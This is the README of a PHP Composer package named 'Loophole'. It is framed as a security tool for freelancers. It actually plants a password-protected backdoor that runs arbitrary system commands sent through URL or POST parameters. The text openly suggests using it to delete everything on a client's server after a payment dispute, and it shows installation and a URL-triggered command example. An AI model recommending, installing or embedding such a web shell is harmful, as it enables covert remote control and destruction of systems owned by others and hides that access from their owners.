# Loophole

This library is designed to provide security to freelancers, as well as others in order to provide secure access to the site without the admin panel. When can it be useful? If you are a freelancer and you have been scammed, you can run some system command on the server to delete everything. In other cases, for example remote control of the site via POST API. In general I make this package for myself but I'm putting it here so someone can use it and not have to write new code every time. I will be glad if I help someone :)

[![packagegist](https://img.shields.io/packagist/v/daniilskli/loophole.svg)](https://packagist.org/packages/daniilskli/loophole)

# QuickStart

* [Installation](#installation)
* [Basic Usage](#basic-usage)
* [Methods](#methods)

## Installation
`composer require daniilskli/loophole`

## Basic Usage
```
<?php

require_once __DIR__ . "/../vendor/autoload.php";

use Loophole\Setup;
use Loophole\Config;

$loophole = new Setup((new Config("myTopSecretPassword"))->setLog(true));
$loophole->start();

```
And in url address  
`http://localhost:8080/?password=myTopSecretPassword&command=touch hello.txt&args={} // Creates a "hello.txt" file`

### Warning!
`password`, `command` and `args` - required parameters.

### Methods
#### Config
- `__construct(string password)`  
- `setLog(true or false, path (has default value))` usage `monolog` library  
- `setMethod(string 'POST' or 'GET')` you can use `Loophole\Config\Method`  

#### Setup
- `__construct(Config)`  
- `start()`

## End
That's all for now, I'll create a wiki with a better explanation of everything later.
